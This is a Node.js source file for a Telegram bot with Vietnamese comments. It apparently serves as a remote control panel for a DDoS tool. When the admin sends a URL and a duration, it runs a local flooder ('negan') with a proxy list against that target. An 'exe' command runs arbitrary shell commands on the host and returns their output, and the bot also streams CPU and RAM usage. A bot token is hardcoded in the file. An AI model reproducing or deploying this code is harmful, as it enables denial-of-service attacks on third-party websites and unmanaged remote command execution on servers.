const TelegramBot = require('node-telegram-bot-api');
const { exec } = require('child_process');
const os = require('os');

// C·∫•u h√¨nh bot
const token = '7534473375:AAEcw4C0iYwK0oHoXjt0ioq4DYGFyS7WFX0'; // Thay th·∫ø b·∫±ng token c·ªßa b·∫°n
const bot = new TelegramBot(token, { polling: true });
const adminId = 7371969470; // Thay th·∫ø b·∫±ng ID c·ªßa admin

// ƒê·∫∑t bot s·∫µn s√†ng ngay l·∫≠p t·ª©c
let isBotReady = true;
bot.sendMessage(adminId, 'ü§ñ Bot ƒë√£ s·∫µn s√†ng nh·∫≠n l·ªánh.');
console.log('[DEBUG] Bot ƒë√£ kh·ªüi ƒë·ªông xong v√† s·∫µn s√†ng nh·∫≠n l·ªánh.');

// H√†m l·∫•y th√¥ng s·ªë CPU v√† RAM
const getSystemStats = () => {
    const totalMemory = os.totalmem(), freeMemory = os.freemem(), usedMemory = totalMemory - freeMemory;
    const memoryUsagePercent = ((usedMemory / totalMemory) * 100).toFixed(2);
    const cpuUsagePercent = (os.cpus().reduce((acc, cpu) => {
        const total = Object.values(cpu.times).reduce((a, b) => a + b, 0), idle = cpu.times.idle;
        return acc + (100 - (idle / total) * 100);
    }, 0) / os.cpus().length).toFixed(2);
    return { memoryUsagePercent, cpuUsagePercent, totalMemory: (totalMemory / 1024 / 1024 / 1024).toFixed(0), freeMemory: (freeMemory / 1024 / 1024 / 1024).toFixed(0) };
};

// G·ª≠i th√¥ng s·ªë CPU v√† RAM m·ªói 14 gi√¢y
setInterval(() => {
    const stats = getSystemStats(), cpuFreePercent = (100 - parseFloat(stats.cpuUsagePercent)).toFixed(2);
    bot.sendMessage(adminId, `Th√¥ng s·ªë ƒë√£ s·ª≠ d·ª•ng: üöÄ\n- CPU ƒë√£ s·ª≠ d·ª•ng: ${stats.cpuUsagePercent}%\n- RAM ƒë√£ s·ª≠ d·ª•ng: ${stats.memoryUsagePercent}%\n\nTh√¥ng s·ªë c√≤n tr·ªëng: ‚ù§Ô∏è\n- CPU c√≤n tr·ªëng: ${cpuFreePercent}%\n- RAM c√≤n tr·ªëng: ${stats.freeMemory}GB\n- T·ªïng RAM: ${stats.totalMemory}GB`);
}, 14000);

// H√†m g·ª≠i k·∫øt qu·∫£ d∆∞·ªõi d·∫°ng Markdown
const sendMarkdownResult = async (chatId, command, output) => {
    const message = `üöÄ K·∫øt qu·∫£ l·ªánh: \`${command}\`\n\`\`\`\n${output}\n\`\`\``;
    try {
        await bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
    } catch (error) {
        console.error(`[ERROR] G·ª≠i tin nh·∫Øn th·∫•t b·∫°i: ${error.message}`);
        await bot.sendMessage(chatId, `üö´ L·ªói khi g·ª≠i k·∫øt qu·∫£: ${error.message}`);
    }
};

// H√†m th·ª±c thi l·ªánh pkill cho t·ª´ng t√™n file
const executePkill = async (chatId, files) => {
    for (const file of files) {
        const command = `pkill -f -9 ${file}`;
        console.log(`[DEBUG] L·ªánh ƒë∆∞·ª£c th·ª±c thi: ${command}`);
        await bot.sendMessage(chatId, `üöÄ ƒêang th·ª±c thi l·ªánh: \`${command}\``);
        const child = exec(command);
        let output = '';
        child.stdout.on('data', (data) => { output += data.toString(); console.log(`[DEBUG] stdout: ${data.toString()}`); });
        child.stderr.on('data', (data) => { output += data.toString(); console.log(`[DEBUG] stderr: ${data.toString()}`); });
        child.on('close', (code) => {
            console.log(`[DEBUG] L·ªánh ƒë√£ k·∫øt th√∫c v·ªõi m√£ tho√°t: ${code}`);
            if (code === 0) {
                sendMarkdownResult(chatId, command, '‚úÖ L·ªánh ƒë√£ ƒë∆∞·ª£c th·ª±c thi th√†nh c√¥ng.');
            } else {
                sendMarkdownResult(chatId, command, '‚ùå Kh√¥ng t√¨m th·∫•y ti·∫øn tr√¨nh ph√π h·ª£p.');
            }
        });
    }
};

// X·ª≠ l√Ω l·ªánh t·ª´ admin
bot.on('message', async (msg) => {
    const chatId = msg.chat.id, text = msg.text;
    if (chatId !== adminId) return bot.sendMessage(chatId, 'B·∫°n kh√¥ng c√≥ quy·ªÅn th·ª±c hi·ªán l·ªánh n√†y.');

    // X·ª≠ l√Ω l·ªánh d·∫°ng "https://muahack.com 10"
    if (text.startsWith('http') || text.startsWith('htttp') || text.startsWith('htttps')) {
        const correctedText = text.replace(/^ht+tps?:\/\//, 'https://'), parts = correctedText.split(' ');
        if (parts.length !== 2 || isNaN(parts[1])) return bot.sendMessage(chatId, 'Sai ƒë·ªãnh d·∫°ng! Nh·∫≠p theo: <URL> <time>.');
        const [host, time] = parts, command = `node ./negan -m GET -u ${host} -p live.txt --full true -s ${time}`;
        console.log(`[DEBUG] L·ªánh ƒë∆∞·ª£c th·ª±c thi: ${command}`);
        await bot.sendMessage(chatId, `üöÄ ƒêang th·ª±c thi l·ªánh: \`${command}\``);
        const child = exec(command);
        let output = '';
        child.stdout.on('data', (data) => { output += data.toString(); console.log(`[DEBUG] stdout: ${data.toString()}`); });
        child.stderr.on('data', (data) => { output += data.toString(); console.log(`[DEBUG] stderr: ${data.toString()}`); });
        child.on('close', () => { console.log(`[DEBUG] L·ªánh ƒë√£ k·∫øt th√∫c v·ªõi k·∫øt qu·∫£: ${output}`); sendMarkdownResult(chatId, command, output); });
        return;
    }

    // X·ª≠ l√Ω l·ªánh b·∫Øt ƒë·∫ßu b·∫±ng "exe"
    if (text.startsWith('exe ')) {
        const command = text.slice(4).trim();
        if (!command) return bot.sendMessage(chatId, 'L·ªánh kh√¥ng ƒë∆∞·ª£c ƒë·ªÉ tr·ªëng. V√≠ d·ª•: "exe ls"');
        console.log(`[DEBUG] L·ªánh ƒë∆∞·ª£c th·ª±c thi: ${command}`);
        await bot.sendMessage(chatId, `üöÄ ƒêang th·ª±c thi l·ªánh: \`${command}\``);

        // X·ª≠ l√Ω l·ªánh pkill ƒë·∫∑c bi·ªát
        if (command.startsWith('pkill')) {
            const filesToKill = command.split(' ').slice(1); // L·∫•y c√°c t√™n file t·ª´ l·ªánh pkill
            if (filesToKill.length === 0) {
                await bot.sendMessage(chatId, '‚ùå L·ªánh pkill c·∫ßn c√≥ √≠t nh·∫•t m·ªôt t√™n file.');
                return;
            }
            await executePkill(chatId, filesToKill);
            return;
        }

        // X·ª≠ l√Ω c√°c l·ªánh kh√°c
        const child = exec(command);
        let output = '';
        child.stdout.on('data', (data) => { output += data.toString(); console.log(`[DEBUG] stdout: ${data.toString()}`); });
        child.stderr.on('data', (data) => { output += data.toString(); console.log(`[DEBUG] stderr: ${data.toString()}`); });
        child.on('close', () => { console.log(`[DEBUG] L·ªánh ƒë√£ k·∫øt th√∫c v·ªõi k·∫øt qu·∫£: ${output}`); sendMarkdownResult(chatId, command, output); });
        return;
    }

    // N·∫øu l·ªánh kh√¥ng h·ª£p l·ªá
    bot.sendMessage(chatId, 'L·ªánh kh√¥ng h·ª£p l·ªá. Vui l√≤ng b·∫Øt ƒë·∫ßu l·ªánh v·ªõi "exe" ho·∫∑c nh·∫≠p URL v√† th·ªùi gian.');
});
